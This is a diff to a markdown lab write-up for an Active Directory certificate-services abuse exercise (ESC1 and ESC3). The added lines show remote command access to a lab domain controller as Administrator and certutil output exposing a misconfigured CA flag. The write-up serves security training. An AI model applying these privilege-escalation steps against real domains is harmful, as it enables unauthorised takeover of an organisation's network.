@@ -1,4 +1,4 @@
-# Learning Objective 21 (Domain Privilege Escalation | AD CS Abuse - ESC1 + ESC3)
+# Learning Objective 21 (AD Certificate Services Abuse | ESC1 + ESC3)
 
 ## Tasks
 
@@ -404,13 +404,45 @@ Cached Tickets: (1)
 
 Finally, access `mcorp-dc`!
 
-`winrs -r:mcorp-dc cmd /c set username`:
+`winrs -r:mcorp-dc cmd`:
+```
+Microsoft Windows [Version 10.0.20348.2762]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator>
+```
+🚀
+
+![mcorp-dc | administrator](https://custom-icon-badges.demolab.com/badge/dcorp--dc-administrator-64b5f6?logo=windows11&logoColor=white)
+
+`set username`:
 ```
 USERNAME=Administrator👤
 ```
+
+`set computername`:
+```
+COMPUTERNAME=MCORP-DC🖥️
+```
+
+`certutil -getreg policy\EditFlags`:
+```
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\moneycorp-MCORP-DC-CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags:
+
+  EditFlags REG_DWORD = 15014e (1376590)
+    EDITF_REQUESTEXTENSIONLIST -- 2
+    EDITF_DISABLEEXTENSIONLIST -- 4
+    EDITF_ADDOLDKEYUSAGE -- 8
+    EDITF_BASICCONSTRAINTSCRITICAL -- 40 (64)
+    EDITF_ENABLEAKIKEYID -- 100 (256)
+    EDITF_ENABLEDEFAULTSMIME -- 10000 (65536)
+    EDITF_ATTRIBUTESUBJECTALTNAME2📌 -- 40000 (262144)
+    EDITF_ENABLECHASECLIENTDC -- 100000 (1048576)
+CertUtil: -getreg command completed successfully.
+```
 🚩
 
-2. **Exploit ESC1 vulnerable certificate templates to escalate privileges to DA and EA**
+2. **Exploit ESC3 vulnerable certificate templates to escalate privileges to DA and EA**
 
 - **Find ESC3 Vulnerable Certificate Templates**
 
